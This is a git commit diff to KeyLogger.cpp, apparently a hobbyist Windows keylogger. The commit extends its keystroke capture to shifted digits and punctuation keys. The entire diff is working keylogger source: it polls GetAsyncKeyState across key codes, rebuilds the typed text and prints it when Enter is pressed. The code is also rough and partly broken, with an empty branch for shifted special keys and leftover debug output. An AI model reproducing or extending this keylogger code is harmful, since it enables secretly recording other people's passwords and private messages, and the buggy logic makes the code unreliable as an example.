9de3844f6fe46c7eed61569017513a6596dbeb8c
lshen365 <lshen1905@gmail.com>
2019-06-11 00:16:39 -0600

    Updated special keys such as ; ' ] [ etc

--- KeyLogger.cpp
+++ KeyLogger.cpp
@@ -7,26 +7,79 @@ using namespace std;
 
 
 
+string currentSentence = "";
+
+/*
+Checks to see if a value is a number or not 
+*/
 bool isNum(DWORD value) {
 	if (value >= 0x30 && value <= 0x39)
 		return true;
 	return false;
 }
-string currentSentence = "";
+
+bool isSpecial(DWORD value) {
+	if (value >= 0xBA && value <= 0xDF)
+		return true;
+	return false;
+}
 void findLetterTyped() {
 
 	char alphabet[26] = { 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z' };
 	char numbers[10] = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9' };
+	char special[11] = { ';','=',',','-','.','/','`','[','\\',']','\''};
 
 	DWORD word = 0x30;
-	for (int i = 0; i < 43; i++) {
+	for (int i = 0; i < 52; i++) {
 		if ((GetAsyncKeyState(word) & 1)) { //Loops through every single letter until it finds the one with the least bit number changed 
 
-			if (isNum(word)) {
+			if (GetKeyState(VK_SHIFT) & 0x8000) {
+				if (isNum(word)) {
+					switch (word) {
+					case 0x31:
+						currentSentence += "!";
+						break;
+					case 0x32:
+						currentSentence += "@";
+						break;
+					case 0x33:
+						currentSentence += "#";
+						break;
+					case 0x34:
+						currentSentence += "$";
+						break;
+					case 0x35:
+						currentSentence += "%";
+						break;
+					case 0x36:
+						currentSentence += "^";
+						break;
+					case 0x37:
+						currentSentence += "&";
+						break;
+					case 0x38:
+						currentSentence += "*";
+						break;
+					case 0x39:
+						currentSentence += "(";
+						break;
+					case 0x30:
+						currentSentence += ")";
+						break;
+					default:
+						currentSentence += "ERROR";
+						break;
+					}
+				}
+				else {
+					currentSentence += toupper(alphabet[abs(42 - i - 26 + 1)]);
+				}
+				
+				
+				
+			}else if (isNum(word)) { //Deals with Uppercase letters
 				currentSentence += numbers[i];
-			}else if (GetAsyncKeyState(VK_SHIFT)) { //Deals with Uppercase letters
-
-				currentSentence+=toupper(alphabet[abs(42 - i - 26 + 1)]);
+				
 			}
 			else {
 				currentSentence += alphabet[abs(42-i-26+1)];
@@ -35,13 +88,36 @@ void findLetterTyped() {
 		}
 
 		word++;
-		if (GetAsyncKeyState(VK_RETURN) & 1) {
-			cout << currentSentence << endl;
-			currentSentence = "";
-			return;
-		}
+
 	}
 
+	DWORD specialKey = 0xBA; 
+	for (int i = 0; i < 37; i++) {
+		if (GetAsyncKeyState(specialKey) & 1) {
+			if (GetKeyState(VK_SHIFT)) {
+
+
+			}
+			else {
+				if (i <= 7) {
+					cout << "run" << endl;
+					currentSentence += special[i];
+				
+				}
+				else if (i >= 31) {
+					currentSentence += special[abs(37 - i - 11)];
+				}
+				cout << i << " " << specialKey << endl;
+				
+			}
+		}
+		specialKey++;
+	}
+	if (GetAsyncKeyState(VK_RETURN) & 1) {
+		cout << currentSentence << endl;
+		currentSentence = "";
+		return;
+	}
 }
 
 
